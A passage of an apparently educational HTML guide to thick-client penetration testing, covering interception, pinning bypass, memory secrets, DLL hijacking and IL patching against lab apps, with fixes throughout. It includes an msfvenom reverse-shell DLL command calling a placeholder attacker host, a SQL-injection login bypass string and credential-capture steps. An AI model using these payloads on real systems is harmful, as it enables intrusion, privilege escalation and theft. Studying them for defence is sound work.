+<li><strong>Echo Mirage</strong>: injects a DLL into the app and hooks the Winsock API (<code>send</code> and <code>recv</code>). You can view and edit any TCP or UDP traffic, including non-web protocols, and it decrypts SSL at the API boundary. Set a rule for any direction and address, then launch or inject into the app.</li>
+<li><strong>mitm_relay</strong>: a relay that listens on a local port, forwards to the real server, and tees each connection through Burp so you can use Burp on non-web protocols. Supports SSL and STARTTLS.
+<pre><span class="cm"># DVTA FTP demo: move FTP to port 211, then relay 21 -> server:211 through Burp</span>
+python mitm_relay.py -l 0.0.0.0 -r tcp:21:&lt;your-ip&gt;:211 -p 127.0.0.1:8080</pre>
+Turn on Burp intercept, trigger "Backup data to FTP server", and the FTP <code>USER</code> and <code>PASS</code> flow through Burp.</li>
+<li><strong>InterceptSuite</strong>: a modern, maintained tool for non-web TLS and TCP interception. A good Echo Mirage replacement.</li>
+<li><strong>Frida</strong>: hooks functions at runtime (including crypto and socket calls) and is the main route for certificate pinning bypass.</li>
+</ul>
+
+<h3>8.4 Certificate pinning bypass</h3>
+<p>If the client checks for a specific pinned certificate, Burp's CA is not trusted and interception fails. Three ways past it:</p>
+<ul>
+<li><strong>Frida script</strong> that targets the pinning or validation routine.</li>
+<li><strong>Inject your CA</strong> into the app's trust store, if it uses the OS store or a bundled store you can replace.</li>
+<li><strong>Patch the validation method</strong> to always return "valid" (a dnSpy IL patch for .NET, a byte patch for native code). See Section 13.</li>
+</ul>
+<p><strong>Tools:</strong> Wireshark, TCPView, Burp Suite, Echo Mirage, mitm_relay, InterceptSuite, Frida.</p>
+</section>
+
+<!-- ============ SECTION 9 ============ -->
+<section id="s9">
+<h2><span class="num">9</span>Phase 6 · Binary hardening</h2>
+<p>Check the compile-time protections on the binary. Missing protections make memory-corruption bugs (like buffer overflows) much easier to exploit, and their absence is a finding on its own.</p>
+<div class="tbl-wrap"><table>
+<tr><th>Protection</th><th>What it does</th><th>Compiler flag</th></tr>
+<tr><td>ASLR</td><td>Randomizes memory addresses so exploits cannot rely on fixed locations</td><td><code>/DYNAMICBASE</code></td></tr>
+<tr><td>DEP / NX</td><td>Marks data memory non-executable, blocking many code-injection tricks</td><td><code>/NXCOMPAT</code></td></tr>
+<tr><td>SafeSEH</td><td>Protects the exception handler list from being overwritten</td><td>SafeSEH table</td></tr>
+<tr><td>Control Flow Guard</td><td>Checks that indirect calls go to valid targets</td><td><code>/guard:cf</code></td></tr>
+<tr><td>High-Entropy VA</td><td>Stronger 64-bit ASLR</td><td><code>/HIGHENTROPYVA</code></td></tr>
+<tr><td>Strong naming</td><td>.NET assembly identity and tamper check</td><td>strong-name key</td></tr>
+</table></div>
+<h3>How to check</h3>
+<ul>
+<li><strong>PESecurity</strong> (PowerShell <code>Get-PESecurity</code>): reports ASLR, DEP, SafeSEH, CFG, High-Entropy VA, and strong naming per binary.</li>
+<li><strong>BinScope</strong> (Microsoft): deeper SDL checks, with an HTML pass/fail report.
+<pre>binscope.exe /verbose /html /logfile out.html app.exe</pre></li>
+</ul>
+<p><strong>Tools:</strong> PESecurity, BinScope.</p>
+</section>
+
+<!-- ============ SECTION 10 ============ -->
+<section id="s10">
+<h2><span class="num">10</span>Phase 7 · Memory</h2>
+<p>Because you control the machine, you can read and change the app's live memory. This is a defining thick client technique.</p>
+<ul>
+<li><strong>Read secrets from memory</strong>: passwords (even when the UI masks them), tokens, license keys, crypto keys, PII, connection strings.</li>
+<li><strong>Change values in memory</strong> to bypass login or elevate your role (flip a bool, overwrite a comparison result).</li>
+<li><strong>Attach a debugger</strong>, set breakpoints on auth and crypto routines, and watch or overwrite values as they pass.</li>
+<li><strong>Analyze a crash dump or full process dump</strong> for the same secrets.</li>
+</ul>
+
+<h3>10.1 The easy win: strings in memory</h3>
+<p>Using <strong>Process Hacker</strong>:</p>
+<ol>
+<li>Double-click the process, open the <strong>Memory</strong> tab.</li>
+<li>Click <strong>Strings</strong>, set a minimum length (for example 10) to cut noise.</li>
+<li>Filter by <strong>Contains</strong> on <code>password</code>, <code>user</code>, <code>license</code>, or <code>token</code>.</li>
+</ol>
+<p>In DVTA, logging in and searching reveals the <strong>cleartext password</strong> even though the UI showed dots. In a real zero-day (Section 15), a <strong>license key</strong> was recovered the same way.</p>
+
+<div class="callout warn"><span class="lbl">Root cause, stated correctly</span>Every variable lives in RAM while an app runs. That alone is not the bug. The finding is <strong>long-lived, unmasked, unencrypted retention</strong> of secrets, which happens when developers cache credentials or keys to avoid asking again. Fix: mask or zero secrets right after use, encrypt them in memory, use protected memory such as <code>SecureString</code>, and keep their lifetime short.</div>
+<p><strong>Tools:</strong> Process Hacker, HxD, Strings, x64dbg, WinDbg, dnSpy (debugger).</p>
+</section>
+
+<!-- ============ SECTION 11 ============ -->
+<section id="s11">
+<h2><span class="num">11</span>Phase 8 · Common vulnerabilities</h2>
+<p>Once the API is captured, the server tier is tested with the full <strong>OWASP Web and API Top 10</strong>, exactly like web or mobile: auth, access control (IDOR and BOLA), injection, SSRF, mass assignment, rate limiting, and the rest. The table below lists the classes that keep showing up in thick clients and where each one hides.</p>
+<div class="tbl-wrap"><table>
+<tr><th>Class</th><th>Where it shows up</th></tr>
+<tr><td>Hardcoded secrets / data exposure</td><td>Binary (strings), config, registry, memory, logs</td></tr>
+<tr><td>Insecure local storage</td><td>Cleartext credentials, keys, or logs on disk or in registry</td></tr>
+<tr><td>Weak or broken crypto</td><td>MD5/SHA1 password hashing, weak ciphers, hardcoded keys and IVs</td></tr>
+<tr><td>DLL hijacking / preloading</td><td>Missing DLL on the search path, leading to code execution or privesc</td></tr>
+<tr><td>Verbose error handling</td><td>Stack traces or SQL shown in an exception dialog</td></tr>
+<tr><td>SQL / NoSQL injection</td><td>Two-tier direct DB access, or the three-tier API</td></tr>
+<tr><td>Improper GUI logic</td><td>Disabled or hidden controls, client-only auth checks</td></tr>
+<tr><td>Insecure file / registry permissions</td><td>World-writable paths or keys, leading to tamper or privesc</td></tr>
+<tr><td>Missing binary hardening</td><td>No ASLR / DEP / CFG, raising memory-corruption exploitability</td></tr>
+<tr><td>Buffer overflow / memory corruption</td><td>Native C/C++ clients</td></tr>
+<tr><td>Unquoted service path / weak service perms</td><td>Local privilege escalation</td></tr>
+<tr><td>Business logic / value manipulation</td><td>Client-trusted values: price, role, quantity</td></tr>
+<tr><td>Insecure deserialization</td><td>.NET and Java object streams</td></tr>
+<tr><td>Transport weaknesses</td><td>No TLS, weak TLS, no pinning, or bypassable pinning</td></tr>
+</table></div>
+<p><strong>Automated help:</strong> Visual Code Grepper (VCG) pattern-scans decompiled or source code for dangerous calls and secrets. BinScope for hardening. Sigcheck for signing status.</p>
+</section>
+
+<!-- ============ SECTION 12 ============ -->
+<section id="s12">
+<h2><span class="num">12</span>DLL hijacking (deep dive)</h2>
+<p>DLL hijacking is the flagship thick client attack. You place a malicious DLL where the app will load it <strong>before</strong> or <strong>instead of</strong> the real one. Your code then runs with the app's privileges. If the app is a service running as SYSTEM, a low-privilege user turns into SYSTEM.</p>
+
+<h3>12.1 Why it works: the Windows DLL search order</h3>
+<p>When an app asks for a DLL by name only (no full path), Windows searches these locations <strong>in order</strong> and loads the first match:</p>
+<ol>
+<li>The application's own folder</li>
+<li>The system folder (<code>System32</code>)</li>
+<li>The 16-bit system folder</li>
+<li>The Windows folder</li>
+<li>The current folder</li>
+<li>Each folder listed in the <code>PATH</code> variable</li>
+</ol>
+<p>The <strong>window of opportunity</strong>: if the DLL is <strong>missing</strong> from the trusted early locations, but a folder <strong>you can write to</strong> comes earlier in the order (classically the app folder), your DLL loads instead. Writable install folders are the common real-world case. Try the simulator.</p>
+
+<div class="lab" id="dllsim">
+  <div class="lab-head">Interactive · DLL search-order simulator <span class="tag">flip the conditions, run the search</span></div>
+  <div class="lab-body">
+    <div class="btnrow">
+      <label class="toggle"><input type="checkbox" id="d-system32"> Real DLL present in System32</label>
+      <label class="toggle"><input type="checkbox" id="d-writable" checked> App folder is writable by me</label>
+      <button class="wbtn" id="d-run">Run the search</button>
+    </div>
+    <p style="font-size:12.5px;color:var(--dim);margin:2px 0 6px">Scenario: the app needs <code>dwrite.dll</code>. You planted a malicious copy in the app folder. Watch which location wins.</p>
+    <ol class="orderlist" id="d-list">
+      <li data-loc="app">Application folder <span class="tagr" data-tag>·</span></li>
+      <li data-loc="system32">System32 <span class="tagr" data-tag>·</span></li>
+      <li data-loc="win16">16-bit system folder <span class="tagr" data-tag>·</span></li>
+      <li data-loc="windows">Windows folder <span class="tagr" data-tag>·</span></li>
+      <li data-loc="current">Current folder <span class="tagr" data-tag>·</span></li>
+      <li data-loc="path">PATH folders <span class="tagr" data-tag>·</span></li>
+    </ol>
+    <div class="simout" id="d-out">Set the conditions above and press Run.</div>
+  </div>
+</div>
+
+<h3>12.2 Finding candidates with Procmon</h3>
+<p>Run <strong>Process Monitor</strong> with three filters:</p>
+<pre>Process Name  <span class="cm">is</span>       dvta.exe
+Result        <span class="cm">contains</span> NAME NOT FOUND
+Path          <span class="cm">ends with</span> .dll</pre>
+<p>Then exercise <strong>every</strong> feature (login, add and view expenses, backup), because different code paths load different DLLs. Each <code>NAME NOT FOUND</code> on a <code>.dll</code> inside a writable folder is a candidate. DVTA examples: <code>dwrite.dll</code>, <code>secur32.dll</code>, <code>sspicli.dll</code>, <code>cryptbase.dll</code>, <code>sqlite3.dll</code>, <code>bcrypt.dll</code>.</p>
+<div class="callout"><span class="lbl">Automation</span><strong>Impulsive_DLLHijack</strong> does this end to end. It drives Procmon, replays the app, and prints the confirmed vulnerable DLL paths in one run: <code>ImpulsiveDLLHijack.exe -e path\to\app.exe</code></div>
+
+<h3>12.3 From candidate to shell</h3>
+<div class="fig">
+<div class="cap"><b>Diagram E</b> · the DLL hijack chain, proof of concept to session</div>
+<pre class="mermaid">
+flowchart LR
+  P["Procmon:\nNAME NOT FOUND\n+ .dll + writable"] --> M["msfvenom:\nbuild reverse-shell DLL\nnamed exactly right"]
+  M --> D["Drop DLL into\nthe app folder"]
+  D --> H["Start Metasploit\nmulti/handler"]
+  H --> R["Victim runs app\n-> DLL loads"]
+  R --> S(["Meterpreter session\nwith app's privileges"])
+</pre>
+</div>
+<pre><span class="cm"># build the malicious DLL</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=4444 \
+         -f dll -a x86 --platform windows -o dwrite.dll
+
+<span class="cm"># catch the shell</span>
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;attacker-ip&gt;
+set LPORT 4444
+run</pre>
+<p>Host the DLL, download it on the victim (lab), rename it to the exact missing name, and drop it in the app folder. When the app runs, the DLL loads and Meterpreter opens with the app's privileges. The app itself may crash because your DLL does not implement the real exports. The shell still fires. A polished proof of concept uses a <strong>proxy DLL</strong> that re-exports to the real DLL so the app keeps working.</p>
+
+<h3>12.4 Fixes</h3>
+<ul>
+<li>Load DLLs with <strong>absolute paths</strong>, or use <code>SetDllDirectory</code> with safe-load flags like <code>LOAD_LIBRARY_SEARCH_SYSTEM32</code>.</li>
+<li>Ship <strong>all</strong> required DLLs so none are missing.</li>
+<li><strong>Sign</strong> DLLs and verify signatures before loading.</li>
+<li>Lock down <strong>install-folder permissions</strong> so standard users cannot write there.</li>
+</ul>
+<p><strong>Tools:</strong> Procmon, Impulsive_DLLHijack, msfvenom, Metasploit, Process Hacker.</p>
+</section>
+
+<!-- ============ SECTION 13 ============ -->
+<section id="s13">
+<h2><span class="num">13</span>Reverse engineering &amp; patching</h2>
+<p>This is the technique that ties the client-side stage together: read the code, find the check, remove it. It defeats client-side auth checks, license checks, feature flags, and certificate pinning validators, because they are all the same shape: a boolean or a branch you can flip.</p>
+
+<h3>13.1 Worked example: enable a disabled button in DVTA</h3>
+<p>DVTA's login form hardcodes <code>configureServer.Enabled = false</code>, with no server-side check behind it. Using <strong>dnSpy</strong>:</p>
+<ol>
+<li><strong>File &rarr; Open</strong> and load <code>dvta.exe</code>.</li>
+<li>Browse the type tree. If the app is not obfuscated, everything is human-readable.</li>
+<li>Find the line that disables the button.</li>
+<li>Edit it. At the high level, right-click the method, choose <strong>Edit Method (C#)</strong>, change <code>false</code> to <code>true</code>. At the IL level, change <code>ldc.i4.0</code> (load 0, meaning false) to <code>ldc.i4.1</code> (load 1, meaning true).</li>
+<li><strong>File &rarr; Save Module</strong> (close the running app first to release the file), then relaunch. The button is now enabled.</li>
+</ol>
+
+<div class="lab" id="ilpatch">
+  <div class="lab-head">Interactive · IL patch, before and after <span class="tag">one instruction changes everything</span></div>
+  <div class="lab-body">
+    <div class="patchwrap">
+      <div class="patchcol">
+        <h4>Before</h4>
+        <pre style="margin-top:8px">IL_0012: ldc.i4.0      <span class="cm">// load 0 = false</span>
+IL_0013: callvirt set_Enabled
+<span class="cm">// button stays greyed out</span></pre>
+        <div class="mockbtn off">Configure Server</div>
+      </div>
+      <div class="patchcol">
+        <h4>After the patch</h4>
+        <pre style="margin-top:8px">IL_0012: ldc.i4.1      <span class="cm">// load 1 = true</span>
+IL_0013: callvirt set_Enabled
+<span class="cm">// button is now clickable</span></pre>
+        <div class="mockbtn on" id="p-btn">Configure Server</div>
+      </div>
+    </div>
+    <div class="btnrow" style="margin-top:12px">
+      <button class="wbtn" id="p-toggle">Apply the patch &rarr;</button>
+      <span id="p-status" style="font-family:var(--mono);font-size:12px;color:var(--dim)"></span>
+    </div>
+  </div>
+</div>
+
+<h3>13.2 Patching by language</h3>
+<div class="tbl-wrap"><table>
+<tr><th>Language</th><th>Read</th><th>Edit and rebuild</th></tr>
+<tr><td>.NET</td><td>dnSpy, ILSpy, dotPeek</td><td>dnSpy (edit C# or IL, then save), or ILDASM &rarr; edit &rarr; ILASM</td></tr>
+<tr><td>Java</td><td>JD-GUI, CFR, Procyon, jadx</td><td>Edit source and recompile, or edit bytecode with Recaf or Krakatau and rebuild the jar</td></tr>
+<tr><td>Native C/C++</td><td>Ghidra, IDA, x64dbg</td><td>Patch bytes (for example turn <code>JE</code> into <code>JMP</code>) with x64dbg or HxD, then save</td></tr>
+</table></div>
+
+<h3>13.3 Two shortcuts and one obstacle</h3>
+<ul>
+<li><strong>Direct invocation.</strong> Where you can reference the assembly or jar, write a wrapper that constructs the app's classes and calls its public methods or exported functions directly, skipping the UI and any UI-only auth.</li>
+<li><strong>Obfuscation.</strong> If the managed binary is obfuscated (renamed symbols, encrypted strings, flattened control flow), clean it first. For .NET use <strong>de4dot</strong> before dnSpy. If static cleanup is hard, trace the app dynamically with a debugger or Frida instead.</li>
+</ul>
+</section>
+
+<!-- ============ SECTION 14 ============ -->
+<section id="s14">
+<h2><span class="num">14</span>Language notes</h2>
+<h3>.NET (C#, VB.NET, WPF)</h3>
+<ul>
+<li>Managed IL decompiles to near-source unless obfuscated. This is the prime target for dnSpy live edit and debug.</li>
+<li>Hunt for connection strings in <code>app.config</code> or <code>*.exe.config</code>, hardcoded keys, and misuse of <code>SecureString</code>.</li>
+<li>For WPF/XAML apps, use <strong>Snoop</strong> to walk and edit the visual tree at runtime (<code>Visibility</code> and <code>IsEnabled</code> for GUI-logic privesc).</li>
+</ul>
+<h3>Java</h3>
+<ul>
+<li>JARs decompile cleanly (JD-GUI, CFR, Procyon, jadx). Rebuild with Recaf or Krakatau.</li>
+<li>The standard fix is obfuscation with <strong>ProGuard</strong>. Its absence is a "lack of obfuscation" finding.</li>
+<li>Interception may need JVM proxy properties, a custom trust store, or Frida for pinning bypass.</li>
+</ul>
+<h3>Native C / C++ (and VB6)</h3>
+<ul>
+<li>No managed metadata, so use <strong>Ghidra</strong>, <strong>IDA</strong>, or <strong>x64dbg</strong> at the assembly level.</li>
+<li>Memory-corruption bugs (buffer overflows) are live here, so the binary-hardening flags in Phase 6 matter most.</li>
+<li>Use Winsock hooking (Echo Mirage) for interception.</li>
+</ul>
+<h3>Electron</h3>
+<ul>
+<li>These are JavaScript apps. Unpack <code>app.asar</code> with <code>npx asar extract</code> to get readable source, hardcoded secrets, and Node integration issues (RCE via <code>nodeIntegration</code>, insecure IPC). Chromium DevTools are often reachable.</li>
+</ul>
+</section>
+
+<!-- ============ SECTION 15 ============ -->
+<section id="s15">
+<h2><span class="num">15</span>Case studies</h2>
+<p>All from the DVTA and BetaFast labs and one real CVE. Each one maps a technique above to a concrete result.</p>
+<div class="tbl-wrap"><table>
+<tr><th>#</th><th>Case</th><th>Technique</th><th>Result</th></tr>
+<tr><td>A</td><td>DVTA "Configure Server" button</td><td>dnSpy IL patch <code>ldc.i4.0 &rarr; ldc.i4.1</code></td><td>Client-side-only control bypassed</td></tr>
+<tr><td>B</td><td>DVTA FTP backup</td><td>mitm_relay + Burp on port 21</td><td>FTP username and password captured</td></tr>
+<tr><td>C</td><td>DVTA missing DLLs</td><td>Procmon + msfvenom reverse DLL</td><td>Meterpreter shell</td></tr>
+<tr><td>D</td><td>DVTA registry</td><td>Regshot before/after diff</td><td>Username, password hash, email exposed</td></tr>
+<tr><td>E</td><td>DVTA login</td><td>Process Hacker memory strings</td><td>Cleartext password despite masked UI</td></tr>
+<tr><td>F</td><td>DVTA binary</td><td><code>strings dvta.exe</code></td><td>Hardcoded FTP credential</td></tr>
+<tr><td>G</td><td>DVTA login</td><td>SQLi <code>admin' or 'x'='y'-- -</code></td><td>Authentication bypass (two-tier)</td></tr>
+<tr><td>H</td><td>DVTA debug build</td><td>Malformed input</td><td>Exception dialog leaks the SQL query</td></tr>
+<tr><td>I</td><td>BetaFast admin panel</td><td>Snoop, set <code>Visibility</code> to Visible</td><td>Vertical privesc, created an admin account</td></tr>
+<tr><td>J</td><td>"Remember Me" field</td><td>WinSpy drag over the field</td><td>Saved password unmasked</td></tr>
+</table></div>
+
+<h3>15.1 The real one: a license-bypass CVE chain</h3>
+<p>Against a commercial sync product. This is the case study worth remembering, because it chains three small findings into a business-impact bug.</p>
+<div class="fig">
+<div class="cap"><b>Diagram F</b> · three small leaks become a licensing bypass</div>
+<pre class="mermaid">
+flowchart TB
+  M1["1 · License key sitting\nin process memory\n(Process Hacker strings)"] --> M2["2 · Reuse it on machine 2\n-> error message leaks the\nlicensed machine's MAC address"]
+  M2 --> M3["3 · Spoof that MAC on\nthe attacker's NIC\n(Locally Administered Address)"]
+  M3 --> M4(["MAC-binding check passes\none license reused everywhere\nrevenue loss · CVE assigned"])
+</pre>
+</div>
+<p>Fixes deployed: mask the license key in memory, stop leaking the MAC address in errors, and require an email approval step to re-license a new machine. This one case touches memory secrets, verbose errors, and weak device binding all at once.</p>
+</section>
+
+<!-- ============ SECTION 16 ============ -->
+<section id="s16">
+<h2><span class="num">16</span>Interactive checklist</h2>
+<p>The full field checklist, grouped by phase. Tick items as you go. Your progress is saved in this browser only, so you can close the tab and come back.</p>
+
+<div class="progwrap">
+  <div class="progbar"><i id="prog-fill"></i></div>
+  <div class="progtxt" id="prog-txt">0 / 0</div>
+  <button class="wbtn" id="chk-reset">Reset</button>
+</div>
+<div id="checklist"></div>
+</section>
+
+<!-- ============ SECTION 17 ============ -->
+<section id="s17">
+<h2><span class="num">17</span>Reporting &amp; fixes</h2>
+<h3>17.1 Findings worth always reporting</h3>
+<ul>
+<li>Hardcoded or embedded secrets (binary, config, registry, memory, logs).</li>
+<li>Secrets kept unmasked and unencrypted in memory.</li>
+<li>Client-side-only authorization and GUI-logic bypass (disabled or hidden controls, role flags).</li>
+<li>DLL hijacking, especially against an elevated service (privesc).</li>
+<li>Missing binary hardening, unsigned binaries, no or weak obfuscation.</li>
+<li>Insecure transport (no or weak TLS, bypassable pinning), sensitive data in transit.</li>
+<li>SQLi, IDOR/BOLA, and the rest of the OWASP Web/API Top 10 on the server tier.</li>
+<li>Insecure file or registry permissions, unquoted service paths.</li>
+<li>Weak crypto (MD5/SHA1 password hashing, hardcoded keys), and business-logic or value manipulation.</li>
+</ul>
+
+<h3>17.2 The fixes, and the one theme behind them</h3>
+<div class="callout crit"><span class="lbl">One sentence</span>Almost every thick client finding is the same mistake: the app <strong>trusts the client</strong>. The client is fully under the user's control, so no check that runs there is a real security boundary. The fix is always to move the decision to the server.</div>
+<ul>
+<li><strong>Move logic server-side</strong> (prefer three-tier) and never trust client-supplied values.</li>
+<li><strong>Store secrets safely</strong>: OS keystore or DPAPI, no hardcoding, encrypt at rest, mask and zero in memory, short lifetime.</li>
+<li><strong>Enforce authorization on the server</strong>, not through UI state.</li>
+<li><strong>Harden binaries</strong> (ASLR, DEP, CFG, SafeSEH, High-Entropy VA, strong-name and Authenticode sign) and obfuscate managed code.</li>
+<li><strong>Fix DLL loading</strong> (absolute paths, safe-load flags, ship all DLLs, sign DLLs, lock down folder permissions).</li>
+<li><strong>Protect transport</strong> (strong TLS, robust cert validation that is not trivially patchable).</li>
+<li><strong>Handle errors quietly</strong> (no stack traces, SQL, or internal data to the client).</li>
+<li><strong>Least privilege</strong> on files, registry keys, and services.</li>
+</ul>
+</section>
+
+<!-- ============ GLOSSARY ============ -->
+<section id="gloss">
+<h2>Glossary</h2>
+<dl class="gloss">
+<dt>Thick client</dt><dd>An installed desktop app that does real work locally, unlike a website which relies on the server.</dd>
+<dt>Two-tier / three-tier</dt><dd>App talks straight to a database (two-tier, insecure) versus app talks to a server that talks to the database (three-tier, safer).</dd>
+<dt>Proxy-aware / proxy-unaware</dt><dd>Whether the app honors your proxy setting. Proxy-unaware apps ignore it and need a socket interceptor.</dd>
+<dt>DLL hijacking</dt><dd>Planting a malicious DLL where the app loads it first, gaining code execution with the app's privileges.</dd>
+<dt>IL (Intermediate Language)</dt><dd>The bytecode .NET compiles to. It decompiles to near-source, which makes patching easy.</dd>
+<dt>dnSpy</dt><dd>Tool that decompiles, edits, and debugs .NET assemblies, including live IL edits.</dd>
+<dt>Echo Mirage / mitm_relay / InterceptSuite</dt><dd>Tools that intercept non-web (raw TCP) traffic by hooking sockets or relaying through Burp.</dd>
+<dt>Frida</dt><dd>Runtime instrumentation toolkit. Hooks functions in a running app, the main route for pinning bypass.</dd>
+<dt>Regshot</dt><dd>Takes two registry snapshots and diffs them, so you see only what the app changed.</dd>
+<dt>Procmon</dt><dd>Sysinternals Process Monitor. Live view of file, registry, and process activity, used to find DLL hijack candidates.</dd>
+<dt>Certificate pinning</dt><dd>The app trusts only one specific certificate, which blocks a normal proxy until you bypass the check.</dd>
+<dt>DVTA / BetaFast</dt><dd>Deliberately vulnerable practice apps for thick client testing (.NET and WPF).</dd>
+</dl>
+</section>
+
+<div class="note">
+Educational reference on thick client (desktop application) security testing and its defenses, for authorized assessments and defense. Every technique here assumes you own or are explicitly permitted to test the target. Tool command surfaces and framework internals change over time, so verify exact syntax against current tool docs.
+</div>
+
+<a class="topjump" href="#top">&uarr; top</a>
+</div>
+
+<script>
+/* ---------- 1. Interception strategy finder ---------- */
+(function(){
+  var proxy=document.getElementById('f-proxy'),
+      proto=document.getElementById('f-proto'),
+      pin=document.getElementById('f-pin'),
+      out=document.getElementById('f-out');
+  if(!out) return;
+  function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;');}
+  function render(){
+    var pa=proxy.value, pr=proto.value, pp=pin.value, verdict, steps=[], ease, easeColor;
+    if(pa==='aware' && pr==='http'){
+      verdict='Easiest path: send it straight to Burp.';
+      ease='EASY'; easeColor='var(--low)';
+      steps=['Point the system or app proxy at Burp (127.0.0.1:8080).',
+             'Install the Burp CA certificate in the trust store.',
+             'Test it as a normal web or API target (OWASP Top 10).'];
+    } else if(pa==='aware' && pr==='raw'){
+      verdict='Rare case: proxy setting exists but the protocol is not HTTP.';
+      ease='MEDIUM'; easeColor='var(--med)';
+      steps=['A plain HTTP proxy will not parse this traffic.',
+             'Use a socket-level interceptor (Echo Mirage or InterceptSuite).',
+             'Or relay through Burp with mitm_relay for a non-web protocol.'];
+    } else if(pa==='unaware' && pr==='http'){
+      verdict='It ignores your proxy, so force the traffic to you.';
+      ease='MEDIUM'; easeColor='var(--med)';
+      steps=['Edit the hosts file: point the server hostname at 127.0.0.1.',
+             'Run Burp as an invisible / transparent proxy on that port.',
+             'Set Burp to upstream to the real server so responses still work.'];
+    } else { /* unaware + raw */
+      verdict='Hardest case: no proxy support and non-web traffic.';
+      ease='HARD'; easeColor='var(--high)';
+      steps=['Use a socket interceptor: Echo Mirage hooks Winsock send/recv inside the app.',
+             'Or stand up mitm_relay to tee each connection through Burp.',
+             'InterceptSuite is the modern, maintained alternative.'];
+    }
+    if(pp==='yes'){
+      ease='HARD'; easeColor='var(--high)';
+      steps.push('Pinning is on: your CA is rejected until you bypass it.');
+      steps.push('Bypass with a Frida hook on the validation routine, or patch the validator to return valid, or inject your CA into the app trust store.');
+    }
+    var html='<div class="verdict">'+esc(verdict)+'<span class="ease" style="color:'+easeColor+'">'+ease+'</span></div><ul>';
+    steps.forEach(function(s){html+='<li>'+esc(s)+'</li>';});
+    html+='</ul>';
+    out.innerHTML=html;
+  }
+  [proxy,proto,pin].forEach(function(el){el.addEventListener('change',render);});
+  render();
+})();
+
+/* ---------- 2. DLL search-order simulator ---------- */
+(function(){
+  var runBtn=document.getElementById('d-run');
+  if(!runBtn) return;
+  var list=document.getElementById('d-list'),
+      out=document.getElementById('d-out'),
+      sys=document.getElementById('d-system32'),
+      wr=document.getElementById('d-writable'),
+      items=Array.prototype.slice.call(list.querySelectorAll('li'));
+  function tag(li,txt){li.querySelector('[data-tag]').textContent=txt;}
+  function reset(){
+    items.forEach(function(li){
+      li.className=''; tag(li,'·');
+      if(li.dataset.loc==='app' && wr.checked){li.classList.add('writable');}
+    });
+    out.className='simout'; out.textContent='Ready.';
+  }
+  function run(){
+    reset();
+    runBtn.disabled=true;
+    var i=0;
+    function step(){
+      if(i>0){items[i-1].classList.remove('scanning');}
+      if(i>=items.length){
+        // nothing matched
+        out.className='simout good';
+        out.textContent='No copy of dwrite.dll was found anywhere. The app fails to load it. No hijack.';
+        runBtn.disabled=false; return;
+      }
+      var li=items[i], loc=li.dataset.loc, matched=false, malicious=false;
+      li.classList.add('scanning');
+      if(loc==='app'){
+        // our planted DLL is here, but only if the folder is writable
+        if(wr.checked){matched=true; malicious=true;}
+      } else if(loc==='system32'){
+        if(sys.checked){matched=true; malicious=false;}
+      }
+      setTimeout(function(){
+        li.classList.remove('scanning');
+        if(matched){
+          if(malicious){
+            li.classList.add('hit'); tag(li,'malicious DLL loads');
+            out.className='simout bad';
+            out.innerHTML='<b>Hijack.</b> The app folder is earlier in the search order and it is writable, so your dwrite.dll loads first. Your code now runs with the app’s privileges.';
+          } else {
+            li.classList.add('safe'); tag(li,'real DLL loads');
+            out.className='simout good';
+            out.innerHTML='<b>Safe.</b> The real dwrite.dll was found in System32 before any writable folder. No hijack. (This is why "ship all DLLs" is a fix.)';
+          }
+          runBtn.disabled=false;
+          return;
+        } else {
+          tag(li,'not here');
+          i++; setTimeout(step,180);
+        }
+      },420);
+    }
+    step();
+  }
+  wr.addEventListener('change',reset);
+  sys.addEventListener('change',reset);
+  runBtn.addEventListener('click',run);
+  reset();
+})();
+
+/* ---------- 3. IL patch toggle ---------- */
+(function(){
+  var toggle=document.getElementById('p-toggle');
+  if(!toggle) return;
+  var btn=document.getElementById('p-btn'),
+      status=document.getElementById('p-status'),
+      patched=true; // "after" column already shows patched
+  toggle.addEventListener('click',function(){
+    patched=!patched;
+    if(patched){
+      btn.className='mockbtn on'; btn.style.pointerEvents='';
+      toggle.textContent='Revert the patch ←';
+      status.textContent='ldc.i4.1 in place · button clickable · no server check exists behind it';
+    } else {
+      btn.className='mockbtn off';
+      toggle.textContent='Apply the patch →';
+      status.textContent='ldc.i4.0 · button greyed out';
+    }
+  });
+  btn.addEventListener('click',function(){
+    if(patched){status.textContent='Clicked. Configure Server opened, no authorization was ever checked.';}
+  });
+})();
+
+/* ---------- 4. Interactive checklist ---------- */
+(function(){
+  var mount=document.getElementById('checklist');
+  if(!mount) return;
+  var KEY='tc-checklist-v1';
+  var data=[
+    ['Phase 1 · Enumeration',['Architecture: two-tier vs three-tier','Language and framework identified','Network protocols and ports mapped','Processes observed','Every feature walked','All entry points listed','Auth and access-control model understood']],
+    ['Phase 2 · GUI logic',['Hidden objects revealed','Disabled functions enabled','Masked passwords unmasked','Sensitive info in the UI','GUI access control and injection','Privilege escalation via GUI','Value / price manipulation']],
+    ['Phase 3 · Files & binary',['ACLs on every file and folder','Strong naming checked','Code signing checked (Sigcheck)','Secrets on disk and in config','Hardcoded crypto material','Cleartext storage','DLL preloading candidates','Race conditions on files','Exported functions called without auth','Public methods called via wrapper','Decompile, recover source and keys','Lack of obfuscation']],
+    ['Phase 4 · Registry',['Read access to app keys','Write access to app keys','Sensitive info in registry','Before/after diff (Regshot)','Auth or authz bypass via registry edit']],
+    ['Phase 5 · Traffic',['Sensitive data in transit','Traffic flow analyzed','Proxy path established (aware/unaware)','Non-web interception set up','Certificate pinning bypassed','Traffic manipulation tested']],
+    ['Phase 6 · Binary hardening',['ASLR','DEP / NX','SafeSEH','Control Flow Guard','High-Entropy VA','Strong naming']],
+    ['Phase 7 · Memory',['Sensitive data in memory','Memory manipulation','Auth or authz bypass via memory','Dump file analyzed','Debugger attached, breakpoints set','Dangerous functions identified']],
+    ['Phase 8 · Common vulns',['Decompile and reverse engineer','OWASP Web Top 10','OWASP API Top 10','DLL hijacking','Signature checks (Sigcheck)','Binary analysis (BinScope)','Business logic errors','TCP/UDP attacks','Automated scan (VCG)']]
+  ];
+  var state={};
+  try{state=JSON.parse(localStorage.getItem(KEY))||{};}catch(e){state={};}
+  var total=0; data.forEach(function(g){total+=g[1].length;});
+  var fill=document.getElementById('prog-fill'), txt=document.getElementById('prog-txt');
+  function count(){var n=0;for(var k in state){if(state[k])n++;}return n;}
+  function updateProg(){
+    var n=count();
+    fill.style.width=(total? (n/total*100):0)+'%';
